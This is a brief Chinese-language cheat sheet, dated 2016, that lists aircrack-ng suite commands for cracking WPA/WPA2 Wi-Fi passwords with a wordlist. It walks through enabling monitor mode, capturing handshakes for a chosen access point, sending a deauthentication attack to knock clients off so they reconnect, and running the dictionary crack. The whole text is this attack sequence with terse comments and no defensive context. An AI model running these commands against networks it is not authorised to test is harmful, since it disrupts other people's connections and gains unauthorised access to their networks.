# aircrack-ng---字典破解WPA和WPA2密码

```
airmon-ng check kill     # 杀死一些相关的干扰进程 
airmon-ng start wlan0   #将wlan0设置为监听模式

airodump-ng mon0        #捕获周边无线信号

airodump-ng -c 13 --bssid 23:45:67:89:AB:CD -w wpaCrackLog mon0 #选择信号,打开airodump-ng 开始抓包

aireplay-ng -0 1 -a AP的mac -c 客户端的mac  mon0   #进行Deauth攻击加速破解过程（即断开客户端的连接，使之重新连接）

aircrack-ng -w  字典文件  捕获的cap文件   #字典破解



解决airmon-ng check kill  杀死的wpa_supplicant办法：
service network-manager restart

```


2016/6/22  
